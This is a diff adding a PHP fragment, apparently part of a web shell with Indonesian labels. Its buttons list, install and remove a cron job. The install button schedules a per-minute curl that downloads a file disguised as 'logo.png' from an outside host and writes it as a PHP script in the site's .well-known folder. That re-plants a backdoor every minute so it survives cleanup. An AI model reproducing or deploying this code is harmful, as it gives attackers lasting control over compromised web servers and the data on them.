@@ -1,0 +1,46 @@
+
+			echo "<center>
+		<form method='post'>
+		
+		<input  class = 'form-control col-md-4' style='width:250px; height:40px; 'type='submit' name='list' value='List'>
+		<input  class = 'form-control col-md-4' style='width:250px; height:40px; 'type='submit' name='go' value='Pasang!'>
+		<input  class = 'form-control col-md-4' style='width:250px; height:40px; 'type='submit' name='hapus' value='Hapus!'>
+	
+		</form><hr><br></center>";
+			if ($_POST['list']) {
+			$output=null;
+			$retval=null;
+			exec('crontab -l', $output, $retval);
+			echo "<ol>";
+			foreach ($output as $key){
+    			echo "<li>".$key."</li>";
+			}
+			echo "<li>=================================================</li></ol>";
+				}
+
+			if ($_POST['go']) {
+					if (!is_dir($_SERVER['DOCUMENT_ROOT'].'/.well-known/')) { mkdir($_SERVER['DOCUMENT_ROOT'].'/.well-known/', 0755, true); }
+					exe("(crontab -l 2>/dev/null; echo \"* * * * * curl --silent https://m.slotao.com/logo.png > ".$_SERVER['DOCUMENT_ROOT']."/.well-known/maridono.php\") | crontab -");
+					echo "Link: <a href='//".$_SERVER['HTTP_HOST']."/.well-known/maridono.php' target='_blank'>".$_SERVER['HTTP_HOST']."/.well-known/maridono.php</a> defense tiap menit! ";
+					echo "Done!";
+								$output=null;
+			$retval=null;
+			exec('crontab -l', $output, $retval);
+			echo "<ol>";
+			foreach ($output as $key){
+    			echo "<li>".$key."</li>";
+			}
+			echo "<li>=================================================</li></ol>";
+				}
+			if ($_POST['hapus']) {
+					exe("(crontab -l 2>/dev/null | grep -v \"curl --silent https://m.slotao.com/logo.png > ".$_SERVER['DOCUMENT_ROOT']."/.well-known/maridono.php\") | crontab -");
+
+								$output=null;
+			$retval=null;
+			exec('crontab -l', $output, $retval);
+			echo "<ol>";
+			foreach ($output as $key){
+    			echo "<li>".$key."</li>";
+			}
+			echo "<li>=================================================</li></ol>";
+				}
